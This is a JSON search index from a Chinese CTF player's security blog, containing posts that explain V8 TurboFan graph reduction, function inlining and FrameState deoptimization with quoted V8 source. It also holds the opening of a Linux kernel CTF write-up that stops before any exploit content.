{"pages":[{"title":"[404]","text":"","link":"/404.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"tags","text":"","link":"/tags/index.html"},{"title":"about","text":"P1umer 就读于 北京邮电大学 网络空间安全专业 Dubhe 战队划水队员 | Fake Security Researcher 喜欢 CTF Pwn 以及 Real World Pwn","link":"/about/index.html"}],"posts":[{"title":"V8 Optimize: Reduce Node && Inline","text":"Intro: Analsis of Turbofan ReduceNode &amp;&amp; Inline Reduce-node Analysis 初始化GraphReducer 123//graph-reducer.cc:28GraphReducer::GraphReducer(...){...} 添加reducer器,通过栈结构实现 12345//graph-reducer.cc:43void GraphReducer::AddReducer(Reducer* reducer) { reducers_.push_back(reducer);} ReduceGraph 入口–Backward DFS 123//graph-reducer.cc:78void GraphReducer::ReduceGraph() { ReduceNode(graph()-&gt;end()); } ReduceNode 主逻辑 123456789101112131415161718192021222324252627282930//graph-reducer.cc:48void GraphReducer::ReduceNode(Node* node) { DCHECK(stack_.empty()); DCHECK(revisit_.empty()); Push(node); for (;;) { if (!stack_.empty()) { // Process the node on the top of the stack, potentially pushing more or // popping the node off the stack. ReduceTop(); } else if (!revisit_.empty()) { // If the stack becomes empty, revisit any nodes in the revisit queue. Node* const node = revisit_.front(); revisit_.pop(); if (state_.Get(node) == State::kRevisit) { // state can change while in queue. Push(node); } } else { // Run all finalizers. for (Reducer* const reducer : reducers_) reducer-&gt;Finalize(); // Check if we have new nodes to revisit. if (revisit_.empty()) break; } } DCHECK(revisit_.empty()); DCHECK(stack_.empty());} 进入 Reduce Top，紧接着进入 Reduce 123456789//graph-reducer.cc:82Reduction GraphReducer::Reduce(Node* const node) { auto skip = reducers_.end(); for (auto i = reducers_.begin(); i != reducers_.end();) { if (i != skip) { // 针对传入的 Node 进行 Reducers 的遍历优化 Reduction reduction = (*i)-&gt;Reduce(node);... 进入特定 pass 的Reduce 过程，例如 DeadCodeElimination： 1234567891011//dead-code-elimination.cc:48Reduction DeadCodeElimination::Reduce(Node* node) { DisallowHeapAccess no_heap_access; switch (node-&gt;opcode()) { case IrOpcode::kEnd: return ReduceEnd(node); ... } UNREACHABLE();} 【+】 stack 是实现 backward DFS 的基本栈结构，Reducer为栈式自动机 【+】 revisit 是需要重复 reduce 的 node 列表，通常是reduced 节点的 use 【+】 Reduce Top 实现具体的 Node Reduce；接着循环遍历各 pass 的 Reducer。调用层次: Reduce-node Algorithm【+】TurboFan JIT Design 使用栈结构的递归 根节点为 graph-&gt;end() 从下向上 reduce 如果节点之间存在循环调用，比如：则：因此在Reduce n3 结束时：重新Reduce n6(n3-&gt;use=n6,push n6) 需要维护一个 revisit 栈 行为：A 节点优化完成后将 A 的 use 节点 push stack JSInline当为一个函数A生成优化代码的时候，Turbofan 可以为 A 函数中调用的其他函数进行 Inline。但是仅仅内联用户的代码是远远不够的，编译器还需要对 buildin 函数进行内联，buildin的内联和常规的内联是分开处理的。 General InlineJSInliner 类描述了常规内联的行为，它有一个前驱 JSInliningHeuristic 用来决定内联策略。核心的内联器其实很简单：它针对 JSCallFunction 和 JSCallConstruct 进行处理，用 BytecodeGraphBuilder 根据 Interpreter 生成的 Bytecode 为 callee 直接生成一个子图，最终将 Call 节点替换为该子图。内联既可以内联一个callee，也可以多态内联，内联多个 callee 的 phi。 多态 Inline基本的逻辑和单态差不多，但是需要处理多个目标，而且再决定内联某个多态节点时候，我们需要准确的分离出我们要 inline 的 target。heuristic目前只考虑所有节点都已经知道的多态，例如callee为phi类型而且接受的输入为指向 JSFunctions 的 HeapConstant。而且，至少有一个 candidate 会被选中进行 Inline。 所以当 heuristics 让我们去Inline一个多态节点的时候，我们第一步要做的就是拓展JSCallFunction/JSCallConstruct 为众多单节点 call 的子图，然后对每一个单独分离完毕的 target 进行单态 Inline 。核心的代码在 JSInliningHeuristic::CreateOrReuseDispatch( js-inlining-heuristic.cc#L549 ) Builtin InliningBuiltin 的 Inline 和上面讲述的 General Inline 有些许不同，原因有下: 首先 Builtin 函数没有字节码，Turbofan 直接 Call Stub。 其次，若非一个内联是有类似于没有 check 的 fast 途径，内联不如直接 Call Stub 来的快。 Inline 策略TurboFan 将会在两个地方进行 Builtin 的内联: inlining/native context specialization pass: JSCallReducer typed lowering pass: JSBuiltinReducer从 pass 运行的先后就可以得到: JSBuiltinReducer 处理的 Inline 必须在 Type Pass 后面，也就是需要采集 Type Information；JSCallReducer 处理的则稍早，处理一些类型严格的 Builtin 比如 Array.prototype.map。 Builtin InliningJSInliningHeuristic现讨论单个 pass：JSInliningHeuristic的 Reduce 过程 调用堆栈： JSInliningHeuristic::Reduce123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134//js-inlining-heuristic.cc:89Reduction JSInliningHeuristic::Reduce(Node* node) { DisallowHeapAccessIf no_heap_acess(FLAG_concurrent_inlining); //检查是否是可以被 inline 的 Opcode if (!IrOpcode::IsInlineeOpcode(node-&gt;opcode())) return NoChange(); //检查是否 inline 过该节点 // Check if we already saw that {node} before, and if so, just skip it. if (seen_.find(node-&gt;id()) != seen_.end()) return NoChange(); seen_.insert(node-&gt;id()); //检查该节点是否可以被加入inline列表，判断是否可以当作candidate // Check if the {node} is an appropriate candidate for inlining. Candidate candidate = CollectFunctions(node, kMaxCallPolymorphism); if (candidate.num_functions == 0) { return NoChange(); } else if (candidate.num_functions &gt; 1 &amp;&amp; !FLAG_polymorphic_inlining) { TRACE( &quot;Not considering call site #%d:%s, because polymorphic inlining &quot; &quot;is disabled\\n&quot;, node-&gt;id(), node-&gt;op()-&gt;mnemonic()); return NoChange(); } bool can_inline = false, force_inline_small = true; candidate.total_size = 0; //获取node的framestate Node* frame_state = NodeProperties::GetFrameStateInput(node); FrameStateInfo const&amp; frame_info = FrameStateInfoOf(frame_state-&gt;op()); Handle&lt;SharedFunctionInfo&gt; frame_shared_info; //一般只有一个 num_functions for (int i = 0; i &lt; candidate.num_functions; ++i) { if (!candidate.bytecode[i].has_value()) { // We&apos;re already missing critical data which wouldn&apos;t allow us to // continue the inlining checks. Log a warning and continue. if (candidate.functions[i].has_value()) { TRACE_BROKER(broker(), &quot;Missing bytecode array trying to inline JSFunction &quot; &lt;&lt; *candidate.functions[i]); } else { TRACE_BROKER( broker(), &quot;Missing bytecode array trying to inline SharedFunctionInfo &quot; &lt;&lt; *candidate.shared_info); } // Those functions that don&apos;t have their bytecode serialized probably // don&apos;t have the SFI either, so we exit the loop early. candidate.can_inline_function[i] = false; continue; } SharedFunctionInfoRef shared = candidate.functions[i].has_value() ? candidate.functions[i].value().shared() : candidate.shared_info.value(); candidate.can_inline_function[i] = shared.IsInlineable(); // Do not allow direct recursion i.e. f() -&gt; f(). We still allow indirect // recurion like f() -&gt; g() -&gt; f(). The indirect recursion is helpful in // cases where f() is a small dispatch function that calls the appropriate // function. In the case of direct recursion, we only have some static // information for the first level of inlining and it may not be that useful // to just inline one level in recursive calls. In some cases like tail // recursion we may benefit from recursive inlining, if we have additional // analysis that converts them to iterative implementations. Though it is // not obvious if such an anlysis is needed. if (frame_info.shared_info().ToHandle(&amp;frame_shared_info) &amp;&amp; frame_shared_info.equals(shared.object())) { TRACE(&quot;Not considering call site #%d:%s, because of recursive inlining\\n&quot;, node-&gt;id(), node-&gt;op()-&gt;mnemonic()); candidate.can_inline_function[i] = false; } // A function reaching this point should always have its bytecode // serialized. BytecodeArrayRef bytecode = candidate.bytecode[i].value(); if (candidate.can_inline_function[i]) { can_inline = true; candidate.total_size += bytecode.length(); } // We don&apos;t force inline small functions if any of them is not inlineable. if (!IsSmallInlineFunction(bytecode)) { force_inline_small = false; } } if (!can_inline) return NoChange(); // Gather feedback on how often this call site has been hit before. if (node-&gt;opcode() == IrOpcode::kJSCall) { CallParameters const p = CallParametersOf(node-&gt;op()); candidate.frequency = p.frequency(); } else { ConstructParameters const p = ConstructParametersOf(node-&gt;op()); candidate.frequency = p.frequency(); } // Handling of special inlining modes right away: // - For restricted inlining: stop all handling at this point. // - For stressing inlining: immediately handle all functions. switch (mode_) { case kRestrictedInlining: return NoChange(); case kStressInlining: //我们需要关注 InlineCandidate，接下来会分析 return InlineCandidate(candidate, false); case kGeneralInlining: break; } // 执行次数大于 FLAG_min_inlining_frequency 才会对该节点inline // Don&apos;t consider a {candidate} whose frequency is below the // threshold, i.e. a call site that is only hit once every N // invocations of the caller. if (candidate.frequency.IsKnown() &amp;&amp; candidate.frequency.value() &lt; FLAG_min_inlining_frequency) { return NoChange(); } // candidate 的 bytecode 长度同样也会决定是否 inline // Forcibly inline small functions here. In the case of polymorphic inlining // force_inline_small is set only when all functions are small. if (force_inline_small &amp;&amp; cumulative_count_ &lt; FLAG_max_inlined_bytecode_size_absolute) { TRACE(&quot;Inlining small function(s) at call site #%d:%s\\n&quot;, node-&gt;id(), node-&gt;op()-&gt;mnemonic()); return InlineCandidate(candidate, true); } // In the general case we remember the candidate for later. candidates_.insert(candidate); return NoChange();} JSInliningHeuristic::CollectFunctions1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//js-inlining-heuristic.cc:35JSInliningHeuristic::Candidate JSInliningHeuristic::CollectFunctions( Node* node, int functions_size) { DCHECK_NE(0, functions_size); Node* callee = node-&gt;InputAt(0); Candidate out; out.node = node; //callee包含了函数名称等信息 HeapObjectMatcher m(callee); if (m.HasValue() &amp;&amp; m.Ref(broker()).IsJSFunction()) { //视为 JSFunction out.functions[0] = m.Ref(broker()).AsJSFunction(); JSFunctionRef function = out.functions[0].value(); if (function.IsSerializedForCompilation()) { out.bytecode[0] = function.shared().GetBytecodeArray(); } out.num_functions = 1; return out; } //callee 是合并 ValueInputCount 个 possible callee 的 phi 节点 if (m.IsPhi()) { int const value_input_count = m.node()-&gt;op()-&gt;ValueInputCount(); if (value_input_count &gt; functions_size) { out.num_functions = 0; return out; } for (int n = 0; n &lt; value_input_count; ++n) { HeapObjectMatcher m(callee-&gt;InputAt(n)); if (!m.HasValue() || !m.Ref(broker()).IsJSFunction()) { out.num_functions = 0; return out; } out.functions[n] = m.Ref(broker()).AsJSFunction(); JSFunctionRef function = out.functions[n].value(); if (function.IsSerializedForCompilation()) { out.bytecode[n] = function.shared().GetBytecodeArray(); } } out.num_functions = value_input_count; return out; } if (m.IsJSCreateClosure()) { CreateClosureParameters const&amp; p = CreateClosureParametersOf(m.op()); DCHECK(!out.functions[0].has_value()); out.shared_info = SharedFunctionInfoRef(broker(), p.shared_info()); SharedFunctionInfoRef shared_info = out.shared_info.value(); if (shared_info.HasBytecodeArray()) { out.bytecode[0] = shared_info.GetBytecodeArray(); } out.num_functions = 1; return out; } out.num_functions = 0; return out;} SharedFunctionInfo::GetBytecodeArray12345678910111213BytecodeArray SharedFunctionInfo::GetBytecodeArray() const { DCHECK(HasBytecodeArray()); if (HasDebugInfo() &amp;&amp; GetDebugInfo().HasInstrumentedBytecodeArray()) { return GetDebugInfo().OriginalBytecodeArray(); } else if (function_data().IsBytecodeArray()) { return BytecodeArray::cast(function_data()); } else { DCHECK(function_data().IsInterpreterData()); //返回interpreter数据 return InterpreterData::cast(function_data()).bytecode_array(); }} JSInliningHeuristic::InlineCandidate123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899//js-inlining-heuristic.cc:628Reduction JSInliningHeuristic::InlineCandidate(Candidate const&amp; candidate, bool small_function) { int const num_calls = candidate.num_functions; Node* const node = candidate.node; //只有一个function需要内联 if (num_calls == 1) { //内联 JSCall 的 callee，接下来会分析 Reduction const reduction = inliner_.ReduceJSCall(node); if (reduction.Changed()) { cumulative_count_ += candidate.bytecode[0].value().length(); } return reduction; } //num_calls&gt;1 // Expand the JSCall/JSConstruct node to a subgraph first if // we have multiple known target functions. DCHECK_LT(1, num_calls); Node* calls[kMaxCallPolymorphism + 1]; Node* if_successes[kMaxCallPolymorphism]; Node* callee = NodeProperties::GetValueInput(node, 0); // Setup the inputs for the cloned call nodes. int const input_count = node-&gt;InputCount(); Node** inputs = graph()-&gt;zone()-&gt;NewArray&lt;Node*&gt;(input_count); for (int i = 0; i &lt; input_count; ++i) { inputs[i] = node-&gt;InputAt(i); } // CreateOrReuseDispatch内包含了Graph中对多个 branch 的 Control,effect,value // 的整理,旨在彻底消除 merge，为每个 branch 建立单独的内联依赖 // 包括平行复制 FrameState 和 Call。 // 这里注意，由于分离 merge 前的 FrameState 内存放了 bci 以及 value，value来源于 // phi，而且在 deopt 的时候两个 branch 对应的 bci 应该相同，因此重新分别链接多个 // branch 的时候只需要重新选择 FrameState 插槽的 value。 // Create the appropriate control flow to dispatch to the cloned calls. CreateOrReuseDispatch(node, callee, candidate, if_successes, calls, inputs, input_count); // Check if we have an exception projection for the call {node}. Node* if_exception = nullptr; if (NodeProperties::IsExceptionalCall(node, &amp;if_exception)) { Node* if_exceptions[kMaxCallPolymorphism + 1]; for (int i = 0; i &lt; num_calls; ++i) { if_successes[i] = graph()-&gt;NewNode(common()-&gt;IfSuccess(), calls[i]); if_exceptions[i] = graph()-&gt;NewNode(common()-&gt;IfException(), calls[i], calls[i]); } // Morph the {if_exception} projection into a join. Node* exception_control = graph()-&gt;NewNode(common()-&gt;Merge(num_calls), num_calls, if_exceptions); if_exceptions[num_calls] = exception_control; Node* exception_effect = graph()-&gt;NewNode(common()-&gt;EffectPhi(num_calls), num_calls + 1, if_exceptions); Node* exception_value = graph()-&gt;NewNode( common()-&gt;Phi(MachineRepresentation::kTagged, num_calls), num_calls + 1, if_exceptions); ReplaceWithValue(if_exception, exception_value, exception_effect, exception_control); } // Morph the original call site into a join of the dispatched call sites. Node* control = graph()-&gt;NewNode(common()-&gt;Merge(num_calls), num_calls, if_successes); calls[num_calls] = control; Node* effect = graph()-&gt;NewNode(common()-&gt;EffectPhi(num_calls), num_calls + 1, calls); Node* value = graph()-&gt;NewNode(common()-&gt;Phi(MachineRepresentation::kTagged, num_calls), num_calls + 1, calls); ReplaceWithValue(node, value, effect, control); // Inline the individual, cloned call sites. for (int i = 0; i &lt; num_calls; ++i) { Node* node = calls[i]; if (candidate.can_inline_function[i] &amp;&amp; (small_function || cumulative_count_ &lt; FLAG_max_inlined_bytecode_size_cumulative)) { // 针对每个call均进行ReduceJSCall Reduction const reduction = inliner_.ReduceJSCall(node); if (reduction.Changed()) { // Killing the call node is not strictly necessary, but it is safer to // make sure we do not resurrect the node. node-&gt;Kill(); // Small functions don&apos;t count towards the budget. if (!small_function) { cumulative_count_ += candidate.bytecode[i]-&gt;length(); } } } } return Replace(value);} JSInliner::ReduceJSCall123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268// js-inlining.cc:363 Reduction JSInliner::ReduceJSCall(Node* node) { DCHECK(IrOpcode::IsInlineeOpcode(node-&gt;opcode())); JSCallAccessor call(node); // Determine the call target. base::Optional&lt;SharedFunctionInfoRef&gt; shared_info(DetermineCallTarget(node)); if (!shared_info.has_value()) return NoChange(); DCHECK(shared_info-&gt;IsInlineable()); // Constructor must be constructable. if (node-&gt;opcode() == IrOpcode::kJSConstruct &amp;&amp; !IsConstructable(shared_info-&gt;kind())) { TRACE(&quot;Not inlining &quot; &lt;&lt; *shared_info &lt;&lt; &quot; into &quot; &lt;&lt; info_-&gt;shared_info() &lt;&lt; &quot; because constructor is not constructable.&quot;); return NoChange(); } // Inline node 必须是 kJSCall 或 IsClassConstructor // Class constructors are callable, but [[Call]] will raise an exception. // See ES6 section 9.2.1 [[Call]] ( thisArgument, argumentsList ). if (node-&gt;opcode() == IrOpcode::kJSCall &amp;&amp; IsClassConstructor(shared_info-&gt;kind())) { TRACE(&quot;Not inlining &quot; &lt;&lt; *shared_info &lt;&lt; &quot; into &quot; &lt;&lt; info_-&gt;shared_info() &lt;&lt; &quot; because callee is a class constructor.&quot;); return NoChange(); } // To ensure inlining always terminates, we have an upper limit on inlining // the nested calls. int nesting_level = 0; for (Node* frame_state = call.frame_state(); frame_state-&gt;opcode() == IrOpcode::kFrameState; frame_state = frame_state-&gt;InputAt(kFrameStateOuterStateInput)) { nesting_level++; if (nesting_level &gt; kMaxDepthForInlining) { TRACE(&quot;Not inlining &quot; &lt;&lt; *shared_info &lt;&lt; &quot; into &quot; &lt;&lt; info_-&gt;shared_info() &lt;&lt; &quot; because call has exceeded the maximum depth for function &quot; &quot;inlining.&quot;); return NoChange(); } } Node* exception_target = nullptr; NodeProperties::IsExceptionalCall(node, &amp;exception_target); // JSInliningHeuristic has already filtered candidates without a // BytecodeArray by calling SharedFunctionInfoRef::IsInlineable. For the ones // passing the IsInlineable check, The broker holds a reference to the // bytecode array, which prevents it from getting flushed. // Therefore, the following check should always hold true. CHECK(shared_info.value().is_compiled()); if (!FLAG_concurrent_inlining &amp;&amp; info_-&gt;is_source_positions_enabled()) { SharedFunctionInfo::EnsureSourcePositionsAvailable(isolate(), shared_info-&gt;object()); } TRACE(&quot;Inlining &quot; &lt;&lt; *shared_info &lt;&lt; &quot; into &quot; &lt;&lt; info_-&gt;shared_info() &lt;&lt; ((exception_target != nullptr) ? &quot; (inside try-block)&quot; : &quot;&quot;)); // Determine the targets feedback vector and its context. Node* context; FeedbackVectorRef feedback_vector = DetermineCallContext(node, context); if (FLAG_concurrent_inlining) { if (!shared_info.value().IsSerializedForCompilation(feedback_vector)) { TRACE(&quot;Missed opportunity to inline a function (&quot; &lt;&lt; *shared_info &lt;&lt; &quot; with &quot; &lt;&lt; feedback_vector &lt;&lt; &quot;)&quot;); return NoChange(); } } // [+] 现在开始真正的inlining工作 // ---------------------------------------------------------------- // After this point, we&apos;ve made a decision to inline this function. // We shall not bailout from inlining if we got here. BytecodeArrayRef bytecode_array = shared_info.value().GetBytecodeArray(); // Remember that we inlined this function. int inlining_id = info_-&gt;AddInlinedFunction( shared_info.value().object(), bytecode_array.object(), source_positions_-&gt;GetSourcePosition(node)); // 建立子图 // Create the subgraph for the inlinee. Node* start; Node* end; { // Run the BytecodeGraphBuilder to create the subgraph. Graph::SubgraphScope scope(graph()); BytecodeGraphBuilderFlags flags( BytecodeGraphBuilderFlag::kSkipFirstStackCheck); if (info_-&gt;is_analyze_environment_liveness()) { flags |= BytecodeGraphBuilderFlag::kAnalyzeEnvironmentLiveness; } if (info_-&gt;is_bailout_on_uninitialized()) { flags |= BytecodeGraphBuilderFlag::kBailoutOnUninitialized; } { // TODO(mslekova): Remove the following once bytecode graph builder // is brokerized. Also, remove the context argument from // BuildGraphFromBytecode and extract it from the broker there. AllowHandleDereference allow_handle_deref; AllowHandleAllocation allow_handle_alloc; AllowHeapAllocation allow_heap_alloc; AllowCodeDependencyChange allow_code_dep_change; CallFrequency frequency = call.frequency(); Handle&lt;Context&gt; native_context = handle(info_-&gt;native_context(), isolate()); // ---------------------------------------------------------------- // BuildGraph！ // ---------------------------------------------------------------- BuildGraphFromBytecode(broker(), zone(), bytecode_array.object(), shared_info.value().object(), feedback_vector.object(), BailoutId::None(), jsgraph(), frequency, source_positions_, native_context, inlining_id, flags); } // Extract the inlinee start/end nodes. start = graph()-&gt;start(); end = graph()-&gt;end(); } // If we are inlining into a surrounding exception handler, we collect all // potentially throwing nodes within the inlinee that are not handled locally // by the inlinee itself. They are later wired into the surrounding handler. NodeVector uncaught_subcalls(local_zone_); if (exception_target != nullptr) { // Find all uncaught &apos;calls&apos; in the inlinee. AllNodes inlined_nodes(local_zone_, end, graph()); for (Node* subnode : inlined_nodes.reachable) { // Every possibly throwing node should get {IfSuccess} and {IfException} // projections, unless there already is local exception handling. if (subnode-&gt;op()-&gt;HasProperty(Operator::kNoThrow)) continue; if (!NodeProperties::IsExceptionalCall(subnode)) { DCHECK_EQ(2, subnode-&gt;op()-&gt;ControlOutputCount()); uncaught_subcalls.push_back(subnode); } } } Node* frame_state = call.frame_state(); Node* new_target = jsgraph()-&gt;UndefinedConstant(); // Inline {JSConstruct} requires some additional magic. if (node-&gt;opcode() == IrOpcode::kJSConstruct) { // Swizzle the inputs of the {JSConstruct} node to look like inputs to a // normal {JSCall} node so that the rest of the inlining machinery // behaves as if we were dealing with a regular function invocation. new_target = call.new_target(); // Retrieve new target value input. node-&gt;RemoveInput(call.formal_arguments() + 1); // Drop new target. node-&gt;InsertInput(graph()-&gt;zone(), 1, new_target); // Insert nodes around the call that model the behavior required for a // constructor dispatch (allocate implicit receiver and check return value). // This models the behavior usually accomplished by our {JSConstructStub}. // Note that the context has to be the callers context (input to call node). // Also note that by splitting off the {JSCreate} piece of the constructor // call, we create an observable deoptimization point after the receiver // instantiation but before the invocation (i.e. inside {JSConstructStub} // where execution continues at {construct_stub_create_deopt_pc_offset}). Node* receiver = jsgraph()-&gt;TheHoleConstant(); // Implicit receiver. Node* context = NodeProperties::GetContextInput(node); if (NeedsImplicitReceiver(shared_info.value())) { Node* effect = NodeProperties::GetEffectInput(node); Node* control = NodeProperties::GetControlInput(node); Node* frame_state_inside = CreateArtificialFrameState( node, frame_state, call.formal_arguments(), BailoutId::ConstructStubCreate(), FrameStateType::kConstructStub, shared_info.value(), context); Node* create = graph()-&gt;NewNode(javascript()-&gt;Create(), call.target(), new_target, context, frame_state_inside, effect, control); uncaught_subcalls.push_back(create); // Adds {IfSuccess} &amp; {IfException}. NodeProperties::ReplaceControlInput(node, create); NodeProperties::ReplaceEffectInput(node, create); // Placeholder to hold {node}&apos;s value dependencies while {node} is // replaced. Node* dummy = graph()-&gt;NewNode(common()-&gt;Dead()); NodeProperties::ReplaceUses(node, dummy, node, node, node); Node* result; // Insert a check of the return value to determine whether the return // value or the implicit receiver should be selected as a result of the // call. Node* check = graph()-&gt;NewNode(simplified()-&gt;ObjectIsReceiver(), node); result = graph()-&gt;NewNode(common()-&gt;Select(MachineRepresentation::kTagged), check, node, create); receiver = create; // The implicit receiver. ReplaceWithValue(dummy, result); } else if (IsDerivedConstructor(shared_info-&gt;kind())) { Node* node_success = NodeProperties::FindSuccessfulControlProjection(node); Node* is_receiver = graph()-&gt;NewNode(simplified()-&gt;ObjectIsReceiver(), node); Node* branch_is_receiver = graph()-&gt;NewNode(common()-&gt;Branch(), is_receiver, node_success); Node* branch_is_receiver_true = graph()-&gt;NewNode(common()-&gt;IfTrue(), branch_is_receiver); Node* branch_is_receiver_false = graph()-&gt;NewNode(common()-&gt;IfFalse(), branch_is_receiver); branch_is_receiver_false = graph()-&gt;NewNode(javascript()-&gt;CallRuntime( Runtime::kThrowConstructorReturnedNonObject), context, NodeProperties::GetFrameStateInput(node), node, branch_is_receiver_false); uncaught_subcalls.push_back(branch_is_receiver_false); branch_is_receiver_false = graph()-&gt;NewNode(common()-&gt;Throw(), branch_is_receiver_false, branch_is_receiver_false); NodeProperties::MergeControlToEnd(graph(), common(), branch_is_receiver_false); ReplaceWithValue(node_success, node_success, node_success, branch_is_receiver_true); // Fix input destroyed by the above {ReplaceWithValue} call. NodeProperties::ReplaceControlInput(branch_is_receiver, node_success, 0); } node-&gt;ReplaceInput(1, receiver); // Insert a construct stub frame into the chain of frame states. This will // reconstruct the proper frame when deoptimizing within the constructor. frame_state = CreateArtificialFrameState( node, frame_state, call.formal_arguments(), BailoutId::ConstructStubInvoke(), FrameStateType::kConstructStub, shared_info.value(), context); } // Insert a JSConvertReceiver node for sloppy callees. Note that the context // passed into this node has to be the callees context (loaded above). if (node-&gt;opcode() == IrOpcode::kJSCall &amp;&amp; is_sloppy(shared_info-&gt;language_mode()) &amp;&amp; !shared_info-&gt;native()) { Node* effect = NodeProperties::GetEffectInput(node); if (NodeProperties::CanBePrimitive(broker(), call.receiver(), effect)) { CallParameters const&amp; p = CallParametersOf(node-&gt;op()); Node* global_proxy = jsgraph()-&gt;Constant(broker()-&gt;native_context().global_proxy_object()); Node* receiver = effect = graph()-&gt;NewNode(simplified()-&gt;ConvertReceiver(p.convert_mode()), call.receiver(), global_proxy, effect, start); NodeProperties::ReplaceValueInput(node, receiver, 1); NodeProperties::ReplaceEffectInput(node, effect); } } // Insert argument adaptor frame if required. The callees formal parameter // count (i.e. value outputs of start node minus target, receiver, new target, // arguments count and context) have to match the number of arguments passed // to the call. int parameter_count = shared_info-&gt;internal_formal_parameter_count(); DCHECK_EQ(parameter_count, start-&gt;op()-&gt;ValueOutputCount() - 5); if (call.formal_arguments() != parameter_count) { frame_state = CreateArtificialFrameState( node, frame_state, call.formal_arguments(), BailoutId::None(), FrameStateType::kArgumentsAdaptor, shared_info.value()); } return InlineCall(node, new_target, context, frame_state, start, end, exception_target, uncaught_subcalls);} Reference【+】TurboFan Inlining 【+】TurboFan Inlining Heuristics TODO Builtin Inline 的源码分析","link":"/2019/07/04/V8-Optimize-Reduce-Node-Inline/"},{"title":"V8 Optimize: FrameState","text":"Intro: Analsis of Framestates IR Basic Framestates反优化是 JIT 编译器的一个重要特征。deoptimization 将执行流从优化代码转移到解释器。思考，为了实现这样的转换，我们需要知道： 我们想从哪里继续解释执行 如何从优化代码的物理机器状态在延续点重构解释器运行所需 VM 状态。 第一，为了知道我们想要在哪里继续执行，我们必须保存对当前执行的 function 的 Bytecode 的引用以及一个字节码索引bci(bytecode index,为了让 Ignition 找到准确解释执行点)。第二，对于 VM 状态，可以对于没一个会产生 side effect 的 node 维护一个保存局部变量的变量槽，并映射到在 IR 中的具体值。当执行反优化时可以将 [name:value] 移植到它们在解释器自动机的对应物理位置。 在 IR Graph 中，需要跟踪可能对 VM 的状态产生 side effect 的节点以及相关联的数据，比如内存写入、方法调用等节点。这些会产生新的 VM状态的节点我们统称为状态剥离节点。对于每个这样的节点，我们均需要保存虚拟机在执行这些 node 之后的状态信息。 状态剥离节点本身不能描述 VM 状态，于是我们引入了 Framestates。这些新节点记录了倘若发生 deopt 时的 methods 和 bci，并且存有变量槽。状态剥离节点(比如 StoreProperty ) 有一个描述 VM 状态的 FrameState 作为 input，然后将该节点执行之后的 VM 状态写入 FrameState ,换句话说就是记录了 side effect 。一个例子如下所示：在这个例子中，两个 Store 节点均存在副作用，因此存在 State 剥离，需要引入新的 FrameState 节点才能描述新的虚拟机状态。 在 JIT 优化器 emit 代码之前，我们需要将 deopt 信息与能够触发 deopt 的节点关联起来。为此，我们使用了在触发 deopt 之前的最后一个主状态剥离节点的 FrameState 信息。这意味着两个状态剥离节点之间的所有 JSOperator 均可以返回到同一个个 Bytecode ，并且共享同一组栈变量（同一个 FrameState ）。因此，JIT 已经执行的一些指令可能在反优化之后由解释器重新执行一遍。重新执行除了会浪费点运算资源之外并不会有什么影响，因为我们已经确保了任何重新执行的指令都不会修改全局 State，或者说均不是状态剥离节点。 举个例子，如图5：图中的 Guard 节点作为一个边界检查，如果检查 fail 将会返回deopt。在这个例子中，如果要实现 deopt ，那我们将会使用 FrameState bci=18 节点里的 deopt 信息，对应的状态剥离节点为 StoreField b。 如果遇到了分支合并，则需要在 Merge 节点上保留 FrameState 信息，如图6。如此一来，任何在 merge 后面的 deopt 节点均可以回溯到 merge 。否则的话，由于回溯 merge 会产生状态分支，IR 将无法描述 merge 之后的 VM 状态，Ignition 可能会执行产生错误的 side effect 的操作。 这个设计模型意味着任何可能导致deopt的节点都要与 FrameState 信息相关联。 嵌套 Framestates一个 FrameState 节点可以精确地表示一个 method 作用域的 VM 状态，但是，一个 IR 节点的 VM 状态往往不能由一层 FrameState 表示完全，因此需要 FrameState 嵌套。如何实现呢？方法是在 IR 中通过让一个 FrameState 节点引用另一个 FrameState 节点（后者被称为 outer FrameState）。图7展示了一个例子：需要注意的是，多个 inner FrameState 可以引用相同的 outer FrameState ，这使得 FrameState 在 IR 中是树状表示的。 Virtual Object一些更高级优化甚至需要更多的信息来反应 VM 状态，比如 escape-analysis ，将会导致源文件中的某数据结构直接被优化掉，不能被实际分配。在这种情况下，如果进行 deopt ，则需要知道 JIT 优化掉了什么对象以及这些对象是什么值。如果有了这些信息，那么在 deopt 的时候就可以重新对消失的对象进行分配以及赋值了。图8展示了 IR 中如何表示虚拟的对象(将要被 JIT 优化掉)。每一个虚拟对象都会被表示为 VirtualObject 节点，而且每一个引用这些虚拟对象的栈槽或者本地变量都会指向该节点。VirtualObject 节点真实的内容保存在 VirtualObjectState 节点，作为 FrameState的叶节点。 ps: 其实我不是很能理解为什么 FrameState 需要保留对 VirtualObjectState 的引用，而且obj.v节点可以产生新的 FrameState，图中并未体现出来。另外，根绝这个设计思想，可以推断 escape-analysis 在具体实现当中可能会把 HeapAlloc 节点转化为 VirtualObject，并且可能是通过 inner FrameState 是否存在对 outer FrameState 的某些栈插槽的更改来判断变量是否逃逸，后续的博客会整理出 V8 escape-analysis 的具体细节。 escape-analysis[TODO] Reference【+】http://lafo.ssw.uni-linz.ac.at/papers/2013_VMIL_GraalIR.pdf","link":"/2019/07/03/V8-Optimize-FrameState/"},{"title":"Linux Kernel 初探（一）BabyKernel","text":"Intro: Linux Kernel 的第一次探索 写在前面【+】本文首发于安全客 https://www.anquanke.com/post/id/179161 相关链接【+】题目：https://drive.google.com/open?id=1B5EKTB3c2sYHg26f_tvxejrP0HFzj1Qi【+】 https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge/【+】 http://p4nda.top【+】 https://sunichi.github.io 题目描述解压题目我们可以拿到以下文件:12345p1umer@ubuntu:~/kernel/give_to_player$ ls -ltotal 5516-rwxr-xr-x 1 p1umer 